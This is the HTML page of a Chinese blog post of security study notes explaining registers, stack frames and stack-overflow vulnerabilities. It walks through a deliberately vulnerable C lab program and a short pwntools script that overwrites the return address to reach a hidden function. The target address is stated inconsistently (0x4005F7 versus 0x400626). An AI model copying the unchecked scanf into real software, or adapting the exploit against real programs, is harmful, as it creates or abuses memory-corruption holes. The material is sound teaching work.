@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="基础知识寄存器基础数据寄存器(通用寄存器)主要用来保存操作数和运算结果；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="二进制-栈溢出漏洞">
+<meta property="og:url" content="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="基础知识寄存器基础数据寄存器(通用寄存器)主要用来保存操作数和运算结果；">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164805.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164850.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203170920.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203174218.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164805.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203174411.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203173509.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135142.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135245.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135339.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211147.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211344.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211514.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211651.png">
+<meta property="article:published_time" content="2021-02-03T07:30:02.000Z">
+<meta property="article:modified_time" content="2021-03-03T16:36:04.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="寄存器">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164805.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>二进制-栈溢出漏洞 | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          二进制-栈溢出漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-03 15:30:02" itemprop="dateCreated datePublished" datetime="2021-02-03T15:30:02+08:00">2021-02-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-04 00:36:04" itemprop="dateModified" datetime="2021-03-04T00:36:04+08:00">2021-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">二进制学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="寄存器基础"><a href="#寄存器基础" class="headerlink" title="寄存器基础"></a>寄存器基础</h2><h3 id="数据寄存器-通用寄存器"><a href="#数据寄存器-通用寄存器" class="headerlink" title="数据寄存器(通用寄存器)"></a>数据寄存器(通用寄存器)</h3><p>主要用来保存操作数和运算结果；<span id="more"></span></p>
+<ul>
+<li>  64位:RAX、RBX、RCX、RDX</li>
+<li>  32位:EAX、EBX、ECX、EDX</li>
+<li>  16位:AX、BX、CX、DX</li>
+</ul>
+<h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>主要用于存放存储单元在段内的偏移量；</p>
+<ul>
+<li>  64位:RSI、RDI</li>
+<li>  32位:ESI、EDI</li>
+<li>  16位:SI、DI</li>
+</ul>
+<h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>主要用于存放堆栈内存储单元的偏移量，用它们可实现多种存储器操作数的寻址方式；</p>
+<ul>
+<li>  64位:RBP、RSP</li>
+<li>  32位:EBP、ESP</li>
+<li>  16位:BP、SP</li>
+</ul>
+<p>标注：</p>
+<ul>
+<li>  BP为基指针(BasePointer)寄存器，用它可直接存取堆栈中的数据；</li>
+<li>  SP为堆栈指针(StackPointer)寄存器，用它只可访问栈顶；</li>
+</ul>
+<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>段寄存器是根据内存分段的管理模式而设置的；</p>
+<p>内存单元的物理地址由段寄存器的值和一个偏移量值组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址；</p>
+<ul>
+<li>  CS代码段寄存器(CodeSegmentRegister)，其值为代码段的段值；</li>
+<li>  DS数据段寄存器(DataSegmentRegister)，其值为数据段的段值；</li>
+<li>  ES附加段寄存器(ExtraSegmentRegister)，其值为附加数据段段值；</li>
+<li>  SS堆栈段寄存器(StackSegmentRegister)，其值为堆栈段的段值；</li>
+<li>  FS附加段寄存器(ExtraSegmentRegister)，其值为附加数据段的段值；</li>
+<li>  GS附加段寄存器(ExtraSegmentRegister)，其值为附加数据段的段值；</li>
+</ul>
+<h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p>存放下次将要执行的指令所在代码段的偏移量；</p>
+<ul>
+<li>  64位:RIP</li>
+<li>  32位:EIP</li>
+<li>  16位:IP</li>
+</ul>
+<h2 id="栈基础"><a href="#栈基础" class="headerlink" title="栈基础"></a>栈基础</h2><h3 id="函数与函数栈"><a href="#函数与函数栈" class="headerlink" title="函数与函数栈"></a>函数与函数栈</h3><ul>
+<li>  栈是一种先进后出的特殊数据结构，用于存储程序在运行时的临时数据和地址，用于支撑函数的运行和嵌套调用；</li>
+<li>  栈的分配是由程序编译时确定下来的，无法由程序员控制；</li>
+<li>  栈中存储着线程或者进程的局部变量；</li>
+<li>  不同的进程或线程的栈处于不同的位置，在程序正常运行时不同线程和进程之间不能互相访问彼此的栈地址；</li>
+</ul>
+<h3 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p>以64位程序执行call指令为例，在执行call指令的时候，会向栈中压入call指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行；</p>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164805.png" style="zoom:25%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rbp	;将父函数栈底压入栈中</span><br><span class="line">mov rbp, rsp	;将父函数栈顶变为子函数栈底</span><br><span class="line">sub rsp, 0x70	;抬高栈顶为子函数开辟栈帧</span><br></pre></td></tr></table></figure>
+
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164850.png" style="zoom:25%;">
+
+<p>在函数调用结束时，会执行如下两条指令；</p>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203170920.png" style="zoom:25%;">
+
+<ul>
+<li><p>其中leave指令相当于执行了如下指令，相当于将ebp和esp两个指针恢复到函数被调用前；</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure></li>
+<li><p>  ret指令相当于将栈中的返回地址pop给rip的操作，从而回到父函数继续执行；</p>
+</li>
+</ul>
+<h3 id="函数传递参数"><a href="#函数传递参数" class="headerlink" title="函数传递参数"></a>函数传递参数</h3><p>函数都要通过传递进去的参数来确定其具体的工作内容，而函数间的参数也是通过栈来传递的；</p>
+<p>以如下程序为例，学习32位程序和64位程序的参数传递过程的区别；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>{</span><br><span class="line">    <span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(“%d %d\n”,x,y); </span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    foo(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>32位程序</p>
+<ul>
+<li><p>函数需要传递的参数是直接被压入栈中的的方式，即直接写在栈上；</p>
+<ul>
+<li>  ebp的下方依此是父函数的栈底地址，程序返回地址，传递的参数1，传递的参数2，…；</li>
+<li>  由于在函数调用前通过push指令向栈中压入了数据，使得栈顶被抬高了；</li>
+<li>  在函数调用结束以后，将通过add esp 0x10这条指令，即增加esp来恢复函数调用前的esp；</li>
+</ul>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203174218.png" style="zoom:25%;"></li>
+</ul>
+</li>
+<li><p>64位程序</p>
+<ul>
+<li><p>  传递的参数不再直接写在栈上，而是通过寄存器传递；</p>
+</li>
+<li><p>  这些寄存器分别是rdi、rsi、rdx、rcx、r8、r9，超出寄 存器存放数量的数据才继续在栈上存储；</p>
+</li>
+<li><p>64位程序反汇编结果如下；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203164805.png" style="zoom:25%;"></li>
+<li><p>  函数传递参数不再向栈中压入，而是将参数赋值给edi和esi，由于没有压栈的操作，所以函数执行结束以后也就没有相应的恢复栈顶的过程；</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>栈中数据调用分析如下：</p>
+<ul>
+<li>函数可以调用的栈上的参数主要分为两部分:传递的参数和程序里的局部变量；<ul>
+<li>  这里的printf函数的两个参数分别是父函数传递过去的第一个参数和第二个参数；</li>
+<li>  最上边的mov指令的参数就是局部变量:代码中的数组a；</li>
+</ul>
+</li>
+<li>  不论是函数的参数还是局部变量，都是通过统一的方式:<strong>栈底指针+偏移量</strong>来读取；</li>
+</ul>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203174411.png" style="zoom:25%;">
+
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210203173509.png" style="zoom:25%;">
+
+<h1 id="栈溢出漏洞原理"><a href="#栈溢出漏洞原理" class="headerlink" title="栈溢出漏洞原理"></a>栈溢出漏洞原理</h1><h2 id="栈溢出产生的原因"><a href="#栈溢出产生的原因" class="headerlink" title="栈溢出产生的原因"></a>栈溢出产生的原因</h2><ul>
+<li>  编写代码时，对于数组和字符串等变量的边界没有进行足够的检测；</li>
+<li>栈溢出漏洞的产生总会伴随着以下两个事件：<ul>
+<li>  程序向栈上写入一组数据；</li>
+<li>  写入的数据总长度没有进行有效的检测；</li>
+</ul>
+</li>
+<li>  栈溢出导致攻击者可以通过向其中写入过多的数据，从而覆盖掉栈上的其它变量和原本不能访问到的地址，如返回地址等；</li>
+</ul>
+<h2 id="栈溢出的危害"><a href="#栈溢出的危害" class="headerlink" title="栈溢出的危害"></a>栈溢出的危害</h2><ul>
+<li>  修改父函数栈底地址</li>
+<li>  修改返回地址</li>
+<li>  修改SEH链表地址</li>
+</ul>
+<h1 id="栈溢出漏洞分析"><a href="#栈溢出漏洞分析" class="headerlink" title="栈溢出漏洞分析"></a>栈溢出漏洞分析</h1><p>以如下程序为例进行漏洞分析；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* stack_overflow */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hackhere</span><span class="params">()</span>{</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Congratulations! You hacked me now.\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span>{</span><br><span class="line">    print(<span class="string">"Wrong!!!\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">char</span> username[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your username:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,username);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(username)==<span class="number">4</span> &amp;&amp; !<span class="built_in">strcmp</span>(username,<span class="string">"admin"</span>)){</span><br><span class="line">		hackhere();</span><br><span class="line">    } </span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">		foo();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><ul>
+<li>  程序第12行，在正常的流程下，无法或很难找到一个满足if语句的条件:长度为4而且与 <code>admin</code>相同的字符串；</li>
+<li>  通过观察程序流程发现，<code>main</code>函数中在栈上申请了一个名为<code>username</code>的字符串；</li>
+<li>  在读取该字符串的时候对于读入的长度没有进行检测，导致可以通过<code>scanf</code>函数向栈上写入超过<code>username</code>本身长度的字符串从而造成<strong>栈溢出</strong>；</li>
+</ul>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
+<li><p>扔进IDA，进行静态反汇编，找到<code>hackhere</code>函数的地址<code>0x4005F7</code>和<code>main</code>函数的执行结束前的地址<code>0x400692</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135142.png" style="zoom:25.5%;">
+
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135245.png" style="zoom:25%;"></li>
+<li><p>反汇编<code>main</code>函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210204135339.png" style="zoom:50%;"></li>
+<li><p>分析</p>
+<ol>
+<li> <code>username</code>后面的变量声明注释表明<code>username</code>与rbp之间相差了<code>0x0A</code>个字符；</li>
+<li> 写入<code>0x0A</code>个字符之后就能覆盖掉rbp所指向的父函数栈底地址；</li>
+<li> 想要覆盖rbp所指向的父函数栈底地址下方的函数返回地址，只需要填充<code>0x0A+0x08=0x12</code>个字符后修改即可；</li>
+</ol>
+</li>
+<li><p>构造payload如下：</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./stack_overflow'</span>)</span><br><span class="line">hackhere = p64(<span class="number">0x4005F7</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x0A</span> + <span class="number">0x8</span>) + hackhere</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul>
+<li><p>gdb调试攻击代码；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211147.png" style="zoom:25%;"></li>
+<li><p>继续运行，直到代码停在之前设置的断点<code>0x400692</code>处，可以发现rbp和rsp的地址所指的内容已经被覆盖了；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211344.png" style="zoom:25%;"></li>
+<li><p>接下来使用<code>x /20x 0x7ffeb89a0128</code>指令查看栈底的返回地址，此时栈底的返回地址已经被修改成0x400626，即hackhere函数的地址了；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211514.png" style="zoom:25%;"></li>
+<li><p>继续运行程序，发现程序结束，打印出<code>Congratulations!You hacked me now</code>，证明栈溢出漏洞利用成功；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210208211651.png" style="zoom:25%;"></li>
+</ul>
+<p>备注：<a target="_blank" rel="noopener" href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html" title="二进制-栈溢出漏洞">https://leeyuxun.github.io/二进制-栈溢出漏洞.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"><i class="fa fa-tag"></i> 栈溢出</a>
+              <a href="/tags/%E5%AF%84%E5%AD%98%E5%99%A8/" rel="tag"><i class="fa fa-tag"></i> 寄存器</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html" rel="prev" title="pwntools模块总结">
+      <i class="fa fa-chevron-left"></i> pwntools模块总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html" rel="next" title="二进制-整数溢出漏洞">
+      二进制-整数溢出漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
